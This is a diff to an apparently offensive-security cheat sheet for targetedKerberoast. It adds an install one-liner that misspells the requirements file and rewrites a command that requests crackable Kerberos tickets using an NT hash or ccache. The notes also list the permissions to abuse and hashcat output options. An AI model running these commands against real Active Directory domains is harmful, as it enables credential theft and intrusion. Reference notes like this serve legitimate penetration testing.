@@ -8,6 +8,11 @@
 GenericAll, GenericWrite, WriteProperty or Validated-SPN 
 ```
 
+## _install
+```bash
+git clone <repo> -b <branch> && python -m venv venv && source venv/bin/activate && pip install -r requierements.txt
+```
+
 ## targetedKerberoast (cred)
 --request-user username (just the username, no domain needed)
 -o file       to write ciphers in JtR/hashcat format
@@ -35,8 +40,7 @@ targetedKerberoast.py -v -d <domain_fqdn> -u <user> -H <nt_hash> --dc-ip <dc_ip>
 --only-abuse  Ignore accounts that have an SPN
 --no-abuse    Don't attempt targeted Kerberoasting
 ```
-export KRB5CCNAME=<ccache>
-targetedKerberoast.py -v -d <domain_fqdn> -k --no-pass --dc-ip <dc_ip>
+KRB5CCNAME=<ccache>  targetedKerberoast.py -v -d <domain_fqdn> -k --no-pass --dc-host <dc_fqdn>
 ```
 
 
